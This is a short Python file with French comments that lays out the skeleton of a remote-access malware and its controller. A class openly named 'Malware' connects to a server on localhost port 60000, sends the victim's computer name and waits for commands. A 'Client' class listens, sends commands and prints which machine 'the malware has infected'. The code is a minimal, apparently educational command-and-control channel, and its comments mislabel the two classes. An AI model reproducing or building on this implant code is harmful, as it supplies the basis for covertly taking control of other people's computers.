import socket
import os
import sys
import time

"""
Classe contenant les fonctions communes entre client et serveur
"""


class Machine:
    def __init__(self):
        self.server_addr = ("localhost", 60000)
        self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.language = "utf-8"
        self.buffsize = 1024

    def get_my_socket(self):
        return self.my_socket


"""
Classe contenant les fonctions pour le client
"""


class Malware(Machine):
    def __init__(self):
        super().__init__()

    def start(self):
        self.my_socket.connect(self.server_addr)
        self.send(os.environ["COMPUTERNAME"])

    def send(self, message):
        self.my_socket.send(str(message).encode(self.language))

    def receive(self):
        cmd = self.my_socket.recv(self.buffsize).decode(self.language)
        return cmd

    def quit(self):
        self.my_socket.close()


"""
Classe contenant les fonction pour le malware
"""


class Client(Machine):
    def __init__(self):
        super().__init__()

    def start(self):
        self.my_socket.bind(self.server_addr)
        self.my_socket.listen()

    def send(self, distant_socket, commande):
        distant_socket.send(commande.encode(self.language))

    def receive(self, distant_socket):
        rep = distant_socket.recv(self.buffsize)
        rep = rep.decode(self.language)
        print(rep)

    def quit(self, distant_socket):
        print("Shutting down in 3 seconds")
        time.sleep(3)
        distant_socket.close()
        self.my_socket.close()
        sys.exit()

    def get_hostname(self, distant_socket):
        hostname = distant_socket.recv(self.buffsize).decode(self.language)
        print("The malware has infected the machine of : " + str(hostname))
        return hostname
